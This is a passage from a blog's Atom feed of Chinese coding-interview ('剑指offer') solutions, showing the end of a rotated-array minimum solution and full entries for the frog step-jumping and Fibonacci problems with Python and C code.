(numbers[mid]&gt;numbers[high])</span><br><span class="line">&#123;</span><br><span class="line">low = mid + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">high--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> numbers[low];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个递增排序的数组的一个旋转，输出旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一个旋转，该数组的最小值为1。  &lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>08青蛙跳台阶</title>
    <link href="http://yoursite.com/2020/02/19/08%E9%9D%92%E8%9B%99%E8%B7%B3%E5%8F%B0%E9%98%B6/"/>
    <id>http://yoursite.com/2020/02/19/08%E9%9D%92%E8%9B%99%E8%B7%B3%E5%8F%B0%E9%98%B6/</id>
    <published>2020-02-19T11:22:56.000Z</published>
    <updated>2020-02-19T11:30:12.370Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。</p><p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 2</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= n &lt;= 100</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#同斐波拉契一样</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        a=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            a.append((a[i<span class="number">-1</span>]+a[i<span class="number">-2</span>])%<span class="number">1000000007</span>)</span><br><span class="line">        <span class="keyword">return</span> a[n]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//与斐波拉契一样</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numWays</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>* a = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">100000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。&lt;/p&gt;
&lt;p&gt;答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>07斐波拉契数列</title>
    <link href="http://yoursite.com/2020/02/19/07%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97/"/>
    <id>http://yoursite.com/2020/02/19/07%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97/</id>
    <published>2020-02-19T11:21:12.000Z</published>
    <updated>2020-02-19T11:30:09.535Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下：</p><p>F(0) = 0,   F(1) = 1<br>F(N) = F(N - 1) + F(N - 2), 其中 N &gt; 1.<br>斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。</p><a id="more"></a><p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 2</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 5</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= n &lt;= 100</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不能递归，复杂度太高</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        fb=[<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            fb.append((fb[i<span class="number">-1</span>]+fb[i<span class="number">-2</span>])%<span class="number">1000000007</span>)</span><br><span class="line">        <span class="keyword">return</span> fb[n]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非递归 斐波拉契</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>* a = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">1000000</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下：&lt;/p&gt;
&lt;p&gt;F(0) = 0,   F(1) = 1&lt;br&gt;F(N) = F(N - 1) + F(N - 2), 其中 N &amp;gt; 1.&lt;br&gt;斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
</feed>
